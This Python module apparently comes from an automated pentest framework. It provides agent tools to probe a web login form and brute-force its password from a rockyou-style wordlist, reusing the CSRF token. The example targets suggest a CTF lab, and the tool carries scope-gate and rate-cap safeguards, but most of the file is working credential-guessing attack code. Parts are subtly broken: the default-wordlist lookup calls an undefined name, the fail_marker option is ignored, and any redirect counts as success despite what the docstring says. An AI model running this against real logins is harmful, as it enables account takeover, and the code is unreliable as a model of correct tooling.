"""Session-aware web-login brute-forcing for CSRF-protected form endpoints.

Built for cookie-bound CSRF tokens (Django and friends): ONE session GET of
the login form, then the hidden fields (including the CSRF token) are reused
across attempts while the session cookie is unchanged — each candidate costs
a single POST.  Redirect-locked (allow_redirects=False everywhere): a 3xx is
a signal, never a followed hop.

Tools (auxiliaries.web_login_brute.*):
- web_login_probe   GET the login form once: action, hidden fields (incl.
                    the CSRF token name+value), username/password field
                    candidates, cookies. Zero-guess recon before brute.
- web_login_brute   bounded, rate-capped, gate-checked POST brute against
                    the login form for ONE username.

Safety rails, by construction:
- Scope gate: check_scan(url) BEFORE any traffic; a refusal RAISES
  ScopeGateError before the try (fail-closed — surfaces as Failed on both
  dispatch paths).
- Redirect-locked: allow_redirects=False on every request; 3xx is the
  documented default success oracle (logins typically redirect on success)
  with an optional body success_marker / fail_marker override.
- Bounded: max_attempts (default 500, hard cap 5000), wall-clock cap
  (default 300s), per-request timeout, request rate cap (default 10/s).
- Vhost-gated apps: every tool takes an optional ``host_header`` override
  (e.g. 'earth.local') — requests still CONNECT to the URL's host/IP, so
  the scope gate sees and validates the exact host it checked.
- Wordlist: explicit path wins; empty falls back to utils.wordlists
  resolve_default_wordlist("hydra_passwords") (rockyou on this box), read
  latin-1 with line caps.
"""

import re
import time
from typing import Any, Dict, List, Optional, Tuple

import requests

from constants import framework_tool
from utils.scope_gate import check_scan, ScopeGateError

MAX_ATTEMPTS_CAP = 5000
WALL_CLOCK_CAP_S = 300.0
_HIDDEN_INPUT_RX = re.compile(
    r"<input[^>]*type=[\"']hidden[\"'][^>]*>", re.IGNORECASE)
_INPUT_NAME_RX = re.compile(r"name=[\"']([^\"']+)[\"']", re.IGNORECASE)
_INPUT_VALUE_RX = re.compile(r"value=[\"']([^\"']*)[\"']", re.IGNORECASE)
_FORM_ACTION_RX = re.compile(
    r"<form[^>]*action=[\"']([^\"']*)[\"']", re.IGNORECASE)


def _gate(url: str) -> None:
    ok, reason = check_scan(url)
    if not ok:
        raise ScopeGateError(f"scope gate: {reason}")


def _origin(url: str) -> str:
    from urllib.parse import urlparse
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"


def _host_headers(host_header: str) -> Optional[Dict[str, str]]:
    """Optional Host header override for vhost-gated apps.

    requests still CONNECTS to the URL's host (no DNS change), so the scope
    gate sees and validates the exact host/IP it checked at entry.
    """
    return {"Host": host_header} if host_header else None


def _extract_form(html: str) -> Dict[str, Any]:
    hidden: List[Tuple[str, str]] = []
    for tag in _HIDDEN_INPUT_RX.findall(html or ""):
        name = _INPUT_NAME_RX.search(tag)
        value = _INPUT_VALUE_RX.search(tag)
        if name:
            hidden.append((name.group(1), value.group(1) if value else ""))
    action = _FORM_ACTION_RX.search(html or "")
    return {
        "hidden": hidden,
        "action": action.group(1) if action else "",
    }


def _resolve_wordlist(wordlist: str) -> Optional[str]:
    if wordlist:
        import os
        return wordlist if os.path.isfile(wordlist) else None
    try:
        from utils import wordlists as _wl
        return _wordlists.resolve_default_wordlist("hydra_passwords")
    except Exception:  # noqa: BLE001 - wordlist util unavailable
        return None


@framework_tool(
    "Probe a login form: action URL, hidden fields incl. the CSRF token "
    "name+value, username/password field names, cookies. Zero-guess recon "
    "before web_login_brute. Scope-gated.",
    next_hints=["web_login_brute with the field names found here"],
)
def web_login_probe(url: str, timeout: float = 8.0, insecure: bool = False,
                    host_header: str = ""):
    """GET a login page and report everything a brute needs.

    Args:
        url: Login page URL (scope-gate checked before fetch).
        timeout: Per-request timeout in seconds.
        insecure: Skip TLS verification (self-signed lab certs).
        host_header: Optional Host header override for vhost-gated apps
            (e.g. 'earth.local') — requests still connect to the URL's host,
            so the scope gate sees the same host/IP it validated.
    """
    _gate(url)
    try:
        s = requests.Session()
        r = s.get(url, headers=_host_headers(host_header),
                  timeout=float(timeout), verify=not insecure,
                  allow_redirects=False)
        form = _extract_form(r.text)
        pwd = re.findall(
            r"<input[^>]*type=[\"']password[\"'][^>]*name=[\"']([^\"']+)",
            r.text, re.IGNORECASE) or re.findall(
            r"<input[^>]*name=[\"']([^\"']+)[\"'][^>]*type=[\"']password[\"']",
            r.text, re.IGNORECASE)
        user = re.findall(
            r"name=[\"']([^\"']*user[^\"']*)[\"']", r.text, re.IGNORECASE)[:3]
        return (
            f"web_login_probe {url}\nstatus: {r.status_code} len={len(r.content)}\n"
            f"form action: {form['action'] or '(same URL)'}\n"
            f"hidden fields: {form['hidden']}\n"
            f"password field candidates: {pwd}\n"
            f"username field candidates: {user}\n"
            f"cookies: {s.cookies.get_dict()}"
        )
    except Exception as e:
        return f"web_login_probe error: {e}"


@framework_tool(
    "Brute-force a CSRF-protected web login (session-based, one POST per "
    "candidate, redirect-locked, bounded + rate-capped). Scope-gated.",
    next_hints=["report_finding to log the hit"],
)
def web_login_brute(url: str, username: str,
                    username_field: str = "username",
                    password_field: str = "password",
                    wordlist: str = "", max_attempts: int = 500,
                    rate: float = 10.0, timeout: float = 8.0,
                    insecure: bool = False, success_marker: str = "",
                    fail_marker: str = "",
                    success_statuses: str = "301,302,303,307,308",
                    host_header: str = ""):
    """POST-brute a login form for one username.

    Cookie-bound CSRF: the form's hidden fields (token included) are fetched
    ONCE and reused while the session cookie is unchanged. Redirect-locked
    (allow_redirects=False): the default success oracle is a 3xx to a
    non-login Location; override with success_marker (body) or extra
    success_statuses.

    Args:
        url: Login POST target (same as the form page; scope-gate checked).
        username: The username to try (e.g. 'terra').
        username_field / password_field: Form field names.
        wordlist: Password list path (empty = utils.wordlists default).
        max_attempts: Cap on candidates (default 500, hard cap 5000).
        rate: Max POSTs per second (default 10).
        timeout: Per-request timeout in seconds.
        insecure: Skip TLS verification (self-signed lab certs).
        success_marker: Body substring that means success (optional).
        fail_marker: Body marker that means failure (optional, for noisy oracles).
        success_statuses: Comma list of status codes treated as success.
        host_header: Optional Host header override for vhost-gated apps
            (e.g. 'earth.local') — requests still connect to the URL's host,
            so the scope gate sees the same host/IP it validated.
    """
    _gate(url)
    attempts_cap = min(int(max_attempts), MAX_ATTEMPTS_CAP)
    if attempts_cap < 1 or float(rate) <= 0:
        return "web_login_brute refused: max_attempts and rate must be positive"
    wl_path = _resolve_wordlist(wordlist)
    if not wl_path:
        return ("web_login_brute failed: no readable password list — pass a "
                "wordlist path (or check utils.wordlists discovery)")
    try:
        s = requests.Session()
        r = s.get(url, headers=_host_headers(host_header),
                  timeout=float(timeout), verify=not insecure,
                  allow_redirects=False)
        form = _extract_form(r.text)
        if not form["hidden"] and not form["action"] and "<form" not in r.text.lower():
            return (f"web_login_brute refused: {url} does not look like a "
                    f"login form (no <form>/hidden fields) — web_login_probe "
                    f"it first")
        referer = url
        origin = _origin(url)
        success_set = {int(x) for x in str(success_statuses).split(",") if x.strip()}
        started = time.monotonic()
        fired = 0
        with open(wl_path, "r", encoding="latin-1", errors="replace") as fh:
            for i, line in enumerate(fh):
                if fired >= attempts_cap:
                    break
                if time.monotonic() - started > WALL_CLOCK_CAP_S:
                    return (
                        f"web_login_brute stopped: wall-clock cap ({WALL_CLOCK_CAP_S}s) "
                        f"after {fired} attempts, no hit")
                candidate = line.rstrip("\r\n")
                if not candidate:
                    continue
                # rate cap: send no faster than `rate` per second
                target_t = started + (fired + 1) / float(rate)
                wait = target_t - time.monotonic()
                if wait > 0:
                    time.sleep(wait)
                data = dict(form["hidden"])
                data[username_field] = username
                data[password_field] = candidate
                try:
                    r = s.post(url, data=data, timeout=float(timeout),
                               verify=not insecure, allow_redirects=False,
                               headers={"Referer": referer, "Origin": origin,
                                        **(_host_headers(host_header) or {})})
                except Exception as e:
                    return f"web_login_brute error after {fired} attempts: {e}"
                fired += 1
                body = r.text or ""
                hit = (int(r.status_code) in success_set
                       or (success_marker and success_marker in body))
                if hit:
                    loc = r.headers.get("Location", "")
                    return (
                        f"web_login_brute HIT after {fired} attempt(s): "
                        f"{username} / {candidate}\n"
                        f"status: {r.status_code} location: {loc}\n"
                        f"elapsed: {time.monotonic() - started:.1f}s"
                    )
        elapsed = time.monotonic() - started
        csrf_note = ""
        if "csrf" in body.lower() and fired > 1:
            csrf_note = (" NOTE: 'csrf' appears in failure bodies — if the app "
                         "rotates the token per request, v2 needs a form "
                         "refetch per attempt.")
        return (
            f"web_login_brute: no hit for {username!r} after {fired} attempt(s) "
            f"in {elapsed:.1f}s ({wl_path}).{csrf_note}"
        )
    except ScopeGateError:
        raise
    except Exception as e:
        return f"web_login_brute error: {e}"


@framework_tool(
    "Single-shot web login test (one session GET + POST): verifies the "
    "field names, token reuse, and a credential pair before a brute run. "
    "Scope-gated.",
)
def web_login_test(url: str, username: str, password: str,
                   username_field: str = "username",
                   password_field: str = "password",
                   timeout: float = 8.0, insecure: bool = False,
                   host_header: str = ""):
    """One POST with a real credential pair (recon-grade login test).

    Args:
        url: Login POST target (scope-gate checked before fetch).
        username / password: The credential pair to test.
        username_field / password_field: Form field names.
        timeout: Per-request timeout in seconds.
        insecure: Skip TLS verification (self-signed lab certs).
        host_header: Optional Host header override (vhost-gated apps, e.g.
            'earth.local') — requests still connect to the URL's host/IP.
    """
    _gate(url)
    try:
        s = requests.Session()
        r = s.get(url, headers=_host_headers(host_header),
                  timeout=float(timeout), verify=not insecure,
                  allow_redirects=False)
        form = _extract_form(r.text)
        if not form["hidden"]:
            return "web_login_test error: no hidden fields found (probe the form first)"
        data = dict(form["hidden"])
        data[username_field] = username
        data[password_field] = password
        r = s.post(url, data=data, timeout=float(timeout), verify=not insecure,
                   allow_redirects=False,
                   headers={"Referer": url, "Origin": _origin(url),
                            **(_host_headers(host_header) or {})})
        return (
            f"web_login_test {url} user={username!r}\n"
            f"status: {r.status_code} location: {r.headers.get('Location', '')} "
            f"len={len(r.text)}\n"
            f"body head: {r.text[:300]!r}"
        )
    except Exception as e:
        return f"web_login_test error: {e}"